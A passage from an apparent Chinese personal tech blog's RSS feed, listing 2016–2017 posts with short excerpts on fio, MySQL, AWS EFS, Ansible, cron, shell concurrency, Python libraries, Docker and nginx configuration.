4 5 6 7 8 9 10 # centos6 可以通过 yum 安装 sudo yum -y install fio # 编译安装 wget http://brick.kernel.dk/snaps/fio-2.0.7.tar.gz yum install libaio-devel tar -zxvf fio-2.0.7.tar.gz cd fio-2.0.7 make</description></item><item><title>使用 mysql 统计平均用户在线时长</title><link>https://tangx.in/posts/2017/02/10/mysql-analysis-user-online-length/</link><pubDate>Fri, 10 Feb 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/02/10/mysql-analysis-user-online-length/</guid><description>使用 mysql 统计平均用户在线时长 在表中，记录了用户 login/logout 的时间点（unix时间）。现在需要确定当日用户的在线时长总和，与平均在线时长。 简单的说，就是要求出匹配 userid 的 login/logout timestamp 的差值并求和。 问题在于： 其一，某些用户是跨天 login 或者 logout 的，这样当天的日志就没有可以匹配的 userid_login / userid_logout 。 其二，如果有些重度用户长时间在</description></item><item><title>AWS EFS 使用笔记</title><link>https://tangx.in/posts/2017/01/23/aws-efs-notebook/</link><pubDate>Mon, 23 Jan 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/01/23/aws-efs-notebook/</guid><description>AWS EFS 使用笔记 1 2 3 4 5 # 安装 nfs utils 组件 # On an Amazon Linux, Red Hat Enterprise Linux, or SuSE Linux instance: sudo yum install -y nfs-utils # On an Ubuntu instance: #sudo apt-get install nfs-common iptables 与 sg 设置 mount 的时候注意防火墙 或 security group 的设置 EFS 使用了防火墙，需要将 EFS 所在的 SG 允许中设置允许访问来源。 portmap 端口 111 udp/tcp； nfsd 端口 2049 udp/tcp； mountd 端口 &amp;ldquo;xxx&amp;rdquo; udp/tcp 通常设置允许某 security group. 挂载 使用域名挂载 1</description></item><item><title>ansible playbook 注意事项 02</title><link>https://tangx.in/posts/2017/01/06/ansible-playbook-tips-02/</link><pubDate>Fri, 06 Jan 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/01/06/ansible-playbook-tips-02/</guid><description>ansible playbook 注意事项 02 参考 defaults/main.yml 1 2 3 4 5 6 7 8 9 10 11 12 # 关于缩进 # 在 yaml 语法中, `-` 表示指代的是一个列表格式, 在字典的 key 缩进的时候不能算在内. # # -------------------------------- # 如下的缩进, # server 和 file_name 位于相同层级 # -------------------------------- # - server: # file_name: site3 # listen: 10101 # server_name: nginx_playbook # root: &amp;#34;/tmp/site3&amp;#34; 字典写法 以下三种写法等价 参考 main.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 01 单行写法</description></item><item><title>这是一个测试文档</title><link>https://tangx.in/posts/2016/12/31/post-test/</link><pubDate>Sat, 31 Dec 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/12/31/post-test/</guid><description>这是一个测试文档 为什么更新 2016 年的文章后没有更新？ 为什么创建 2017 年的文章没有出现？ 写于 2017-01-06 文件名为 2016-12-31-post-test.md</description></item><item><title>ansible playbook 注意事项 01</title><link>https://tangx.in/posts/2016/12/30/ansible-playbook-tips-01/</link><pubDate>Fri, 30 Dec 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/12/30/ansible-playbook-tips-01/</guid><description>ansible playbook 注意事项 01 notify 触发条件 不能在没有变更系统状态的条件下触发 notify 。 即，此处不能省略 template 模块 # tasks - name: Configure ntp file template: src=ntp.conf.j2 dest=/etc/ntp.conf notify: restart ntpd tags: ntp 变量文件 通过 vars_files 指定变量文件位置 - name: install MySQL57 hosts: mysql-server remote_user: root vars_files: - vars/dbserver.yml roles: - db 模块提示 在编写 playbook 的时候，遇到不知道或不清楚的模块时。可以使用 command: sys_command_bin args。 如果 ansible 有合适的模块会在 play 运行的输出</description></item><item><title>Mysql 5.6 与5.7 密码权限问题</title><link>https://tangx.in/posts/2016/12/30/mysql56-57-password-issue/</link><pubDate>Fri, 30 Dec 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/12/30/mysql56-57-password-issue/</guid><description>Mysql 5.6 与5.7 密码权限问题 在 5.6 和 5.7 中，Mysql 加强了密码的使用。 Mysql第一次启动的时候，会初始化一个随机的复杂密码，保存在 /var/log/mysqld.log 不再接受简单密码。即复杂密码为： 大小写、数字、符号 的组合。 在命令行中，不能直接使用 mysql -u$USER -p$PASSWORD 的方式了 在 bash script 中使用 mysql 如何在 bash script 中使用 mysql 密码 - stackoverflow.com 讨论 使用 client 配置 在</description></item><item><title>ansible 命令及示例</title><link>https://tangx.in/posts/2016/12/16/ansible-command-usage/</link><pubDate>Fri, 16 Dec 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/12/16/ansible-command-usage/</guid><description>ansible 命令帮助文档 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133</description></item><item><title>cron 定时任务小技巧 进程锁与超时</title><link>https://tangx.in/posts/2016/12/16/cron-tips-lock-timeout/</link><pubDate>Fri, 16 Dec 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/12/16/cron-tips-lock-timeout/</guid><description>cron 定时任务小技巧 进程锁与超时 如果本文的内容仅限于此类小菜，那么未免有些太对不起各位看官，下面上一道硬菜：设置一个 PHP 脚本，每分钟执行一次，怎么搞？听起来这分明就是一道送分题啊： 1 * * * * * /path/to/php /path/to/file 让我们设想如下情况：假如上一分钟的 A 请求还没退出，下一分钟的 B 请求也启动了，就会导致出现 AB</description></item><item><title>shell 模拟多线程处理</title><link>https://tangx.in/posts/2016/11/29/shell-thread-usage/</link><pubDate>Tue, 29 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/29/shell-thread-usage/</guid><description>shell 模拟多线程处理 shell并发的本质就是将代码块放入后台运行 并发数量控制的本质是通过读取管道等待保证后台运行代码块的数量 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #!/bin/sh # # Author: uyinn # mailto: uyinn@live.com # datetime: 2014/04/28 # # # 创建管道 fifofile=/tmp/my.fifo mkfifo $fifofile exec 6&amp;lt;&amp;gt; $fifofile # @1 rm -f $fifofile # 实现并发进程数(7个</description></item><item><title>windows 下为 python 安装 win_inet_pton</title><link>https://tangx.in/posts/2016/11/29/python-libaray-win_inet_pton/</link><pubDate>Tue, 29 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/29/python-libaray-win_inet_pton/</guid><description>windows 下为 python 安装 win_inet_pton AttributeError: &amp;lsquo;module&amp;rsquo; object has no attribute &amp;lsquo;inet_pton&amp;rsquo; 我在windows下使用的是python 2.7.11; 自带的socket是不包含inet_pton方法的. 因此, 在做socket代理的时候, socket调用 inet_pton方法会报错, 提示 AttributeError: 'module' object has no attribute 'inet_pton' . windows 使用 socket 报错: File &amp;#34;E:Python27libsite-packagessocks.py&amp;#34;, line 482, in _SOCKS5_request resolved = self._write_SOCKS5_address(dst, writer) File &amp;#34;E:Python27libsite-packagessocks.py&amp;#34;, line 517, in _write_SOCKS5_address addr_bytes = socket.inet_pton(family, host) AttributeError: &amp;#39;module&amp;#39;</description></item><item><title>使用 python 做网页爬虫 目录</title><link>https://tangx.in/posts/2016/11/29/python-crawler-catalogue/</link><pubDate>Tue, 29 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/29/python-crawler-catalogue/</guid><description>使用python做爬虫 本文是自己在做python爬虫时候的笔记. 目录是从百度文库中找到的, 包含了爬虫基础的方方面面. 各种分类练习代码放在了github上. 本文所有代码就基于 windows 版本的python 2.7.11 x86 1. 最基本抓站 对于抓取的对象, 都会使用正则方式进行匹配。 编写正则的一个小技巧： 1.将整</description></item><item><title>在 python 中使用 opener 进行网页访问</title><link>https://tangx.in/posts/2016/11/29/python-urllib2-opener-usage/</link><pubDate>Tue, 29 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/29/python-urllib2-opener-usage/</guid><description>在 python 中使用 opener 进行网页访问 在网页访问中, urllib2 提供了很多 handler, 并且默认支持 http 访问的。因此, 我们可以使用 http handler 初始化一个 opener。 其他的所支持的模式, 我们可以通过 opener.add_handler(handler) 添加。 1 2 3 4 5 6 # function get_opener() # 后面案例需要调用这个方法 import urllib2 url_abs=&amp;#39;http://ip.cn&amp;#39; opener=urllib2.build_opener(urllib2.HTTPHandler()) resp=opener.open(url_abs) return opener 使用opener处理表单 和 cookie 如果遇到需要登录的网站, 可能就需要</description></item><item><title>python matplatlib 格式化坐标轴时间 datetime</title><link>https://tangx.in/posts/2016/11/28/python_matplotlib_xaxis_datetime_format/</link><pubDate>Mon, 28 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/28/python_matplotlib_xaxis_datetime_format/</guid><description>python matplatlib 格式化坐标轴时间 datetime 使用 matplatlib.pyploy 可以非常方便的将数组转换成时间。但是，如果是时间 datetime.datetime() 作为坐标轴，如果不对时间进行优化，将会显得非常紧凑。 对坐标轴时间进行优化，用到的库为 matplatlib.dates。主要代码如下 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36</description></item><item><title>python 中使用 shutil 实现文件或目录的复制、删除、移动</title><link>https://tangx.in/posts/2016/11/24/python-libaray-shutil-shell-command-for-python/</link><pubDate>Thu, 24 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/24/python-libaray-shutil-shell-command-for-python/</guid><description>python 中使用 shutil 实现文件或目录的复制、删除、移动 shutil 模块 提供了多个针对文件或文件集合的高等级操作。 尤其是，文件的复制和删除操作。 对于独立文件的操作， 参考 os 模块 警告： 即使是更高等级的文件复制功能 ( shutil.copy(), shutil.copy2() ) 也不能复制所有文件的元数据(metadata)。 在 POSIX 平台上，这意味着文件的属主和用户组会</description></item><item><title>Dockerfile 基础命令</title><link>https://tangx.in/posts/2016/11/18/dockerfile-commonds-usage/</link><pubDate>Fri, 18 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/18/dockerfile-commonds-usage/</guid><description>Dockerfile 基础命令 Dockerfile 有十几条命令可用于构建镜像，下文将简略介绍这些命令。 FROM FROM 命令可能是最重要的 Dockerfile 命令。改命令定义了使用哪个基础镜像启动构建流程。基础镜像可以为任意镜像。如果基础镜像没有被发现， Docker 将试图从 Docker image index 来查找该镜像。FROM 命令必须是Dockerfile的首个命令。 # Usage: FROM [image name] # FROM 之</description></item><item><title>nginx 子目录路径配置 root 与 alias 的区别</title><link>https://tangx.in/posts/2016/11/18/nginx-location-root-alias/</link><pubDate>Fri, 18 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/18/nginx-location-root-alias/</guid><description>nginx 子目录路径配置 root 与 alias 的区别 最近在nginx上部署日志分析工具awstats时，在配置awstats分析结果可供网页浏览这步时，分析结果页面访问总是404.后来查阅了一些资料，发现是root和alias的用法区别没搞懂导致的，这里特地将这两者区别详尽道来，供大家学习参考。 Ngin</description></item><item><title>python 字典与 json 异同</title><link>https://tangx.in/posts/2016/11/17/python-json-usage/</link><pubDate>Thu, 17 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/17/python-json-usage/</guid><description>json 与 dict 从结构上来看， json 字符出与 python 字典看起来很相似，都是大括号 {} 括起来的键值对 {key:value}。 s='{&amp;quot;number&amp;quot;:10,&amp;quot;map&amp;quot;:&amp;quot;china&amp;quot;,&amp;quot;10&amp;quot;:&amp;quot;the number&amp;quot;}' 该字符串可以通过**字符串转字典 eval(s) 也可以通过json转字典 json.loads(s) **方式转换成字典 s=&amp;#39;{&amp;#34;number&amp;#34;:10,&amp;#34;map&amp;#34;:&amp;#34;china&amp;#34;,&amp;#34;10&amp;#34;:&amp;#34;the number&amp;#34;}&amp;#39; s_d=eval(s) print s_d # {&amp;#39;map&amp;#39;: &amp;#39;china&amp;#39;, &amp;#39;number&amp;#39;: 10, &amp;#39;10&amp;#39;: &amp;#39;the number&amp;#39;} import json s_j=json.loads(s) print s_j # {u&amp;#39;map&amp;#39;: u&amp;#39;china&amp;#39;, u&amp;#39;number&amp;#39;: 10, u&amp;#39;10&amp;#39;: u&amp;#39;the number&amp;#39;} s_d is s_j # False s_d == s_j # True print type(s_d) # &amp;lt;type &amp;#39;dict&amp;#39;&amp;gt; 然而差别在于： 引</description></item><item><title>使用python生成base64编码和qrcode二维码</title><link>https://tangx.in/posts/2016/11/16/python-qrcode-base64-usage/</link><pubDate>Wed, 16 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/16/python-qrcode-base64-usage/</guid><description>使用python对字符串进行base64编码以及生成字符串qrcode二维码 最近将ss服务器搬到免费docker上面去了。由于是免费的，每次容器重启的时候都会重新绑定服务器地址和容器端口。然而作为一个懒鬼，并不想每次都手动复制粘贴这些信息，于是新需求就是docker容器服务绑定完</description></item><item><title>ansible 入门</title><link>https://tangx.in/posts/2016/11/10/how-to-usage-ansible/</link><pubDate>Thu, 10 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/10/how-to-usage-ansible/</guid><description>ansible 指南 本地执行 https://cloud.tencent.com/developer/ask/28078 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 方法1: - name: check out a git repository local_action: module: git repo: git://foosball.example.org/path/to/repo.git dest: /local/path --- # 方法2: - name: check out a git repository local_action: git args: repo: git://foosball.example.org/path/to/repo.git dest: /local/path 判断目标状态 / 判断目标是否存在 1 2 3 4 5 6 7 8 9 10 - stat: path=/path/to/something register: p # 判断目标是否为文件夹 - debug: msg=&amp;#34;Path exists and is a directory&amp;#34; when: p.stat.isdir is defined and p.stat.isdir # 判断目标是否为文件夹 - debug: msg=&amp;#34;Path exists&amp;#34; when: p.stat.exists</description></item><item><title>windows 下 qiniu-python-sdk 错误及解决方法</title><link>https://tangx.in/posts/2016/11/10/windows-qiniu-python-sdk-typeerror/</link><pubDate>Thu, 10 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/10/windows-qiniu-python-sdk-typeerror/</guid><description>报错信息 File &amp;#34;E:\Python27\lib\site-packages\qiniu\zone.py&amp;#34;, line 131, in host_cache_file_path return home + &amp;#34;/.qiniu_pythonsdk_hostscache.json&amp;#34; TypeError: unsupported operand type(s) for +: &amp;#39;NoneType&amp;#39; and &amp;#39;str&amp;#39; 解决方法 def host_cache_file_path(self): home = os.getenv(&amp;#34;HOME&amp;#34;) # @ 增加 None 值判断 # @ 如果 home 值为 None， 则使用当前路径 if home is None: # home=os.path.join(&amp;#39;.&amp;#39;+&amp;#39;C:\Users\Public&amp;#39;) home=os.curdir # @ 修改路径链接方式 return os.path.join(home,&amp;#34;/.qiniu_pythonsdk_hostscache.json&amp;#34;) # return home + &amp;#34;/.qiniu_pythonsdk_hostscache.json&amp;#34; 出现问题后，使用当前目录 os.curdir 的值通常为运行的 python 文件的根目录（ 如： C: , E:） 问题出现原因 zone.py 预计使用环境为 linux windows 下， python 不能</description></item><item><title>python 中使用参数选项 getopt</title><link>https://tangx.in/posts/2016/11/09/python-getopt-usage/</link><pubDate>Wed, 09 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/09/python-getopt-usage/</guid><description>python 中使用 getopt 分割参数 getopt 库是 python 内建库，以使用 getopt 库为程序指定可选参数。 1 2 3 # @python_version: python_x86 2.7.11 import getopt 指定选择项 opts 使用的长短字符 参数选择项通常有长短两种： 长短选择项本身都为字符串 短选择项的符号必须单字母，如果需要使用参数，选择项符号后需要使用 :（如 'o:'。所有短选择项构成一个字符串传递给 getopt 。 长选择</description></item><item><title>python 字符串处理</title><link>https://tangx.in/posts/2016/11/09/python-string-handing/</link><pubDate>Wed, 09 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/09/python-string-handing/</guid><description>python 字符串处理 python cookbook 第一章 1.1 每次处理一个字符串 将字符串转换为列表 使用内建 list ，将字符串转换为列表 1 theList = list(theString) 1.7 反转字符串 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 astring=&amp;#39;i have a dream&amp;#39; # 逐个字符反转 revchars=astring[::-1] # 按空格拆分为列表并反转 revwards=astring.split() revwards.reverse() revwards=&amp;#39; &amp;#39;.join(revwards) # 使用空格链接 # 逐词反转但是改变空格, 使用正则表达式 import re revwards=re.split(r&amp;#39;(\s+)&amp;#39;,astring) # 使用正则表达式拆分保留</description></item><item><title>dokuwiki语法转markdown语法</title><link>https://tangx.in/posts/2016/11/04/dokuwiki2markdown/</link><pubDate>Fri, 04 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/04/dokuwiki2markdown/</guid><description>亚马逊的免费网站要到期了。回顾了一下，这一年根本没有写什么东西，网站也基本没人访问。EC2除了搭建了一个SS楼梯之外也没有其他的作用。因此也没有继续折腾。 之前的doku经过几次插件折腾，发现创建文章的初始状态完全靠doku系统生成的缓存记录。之前本来打算把网站图片放到七牛这类空间</description></item><item><title>docker官方文档，中文汉化项目</title><link>https://tangx.in/posts/2016/11/03/docker/</link><pubDate>Thu, 03 Nov 2016 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2016/11/03/docker/</guid><description>说明 本项目根据学习进度不定时更新。 所有文章已经放在 github 上了。 并且通过 gitbook 发布。 docker官方文档，中文汉化项目 docker官方文档，中文汉化项目 项目简介 项目简介 第1章 安装运行与卸载 C01S01 在CentOS7上使用二进制包安装 系统环境要求 安装 使用yum安装 使用脚本安装 设置docker daem</description></item></channel></rss>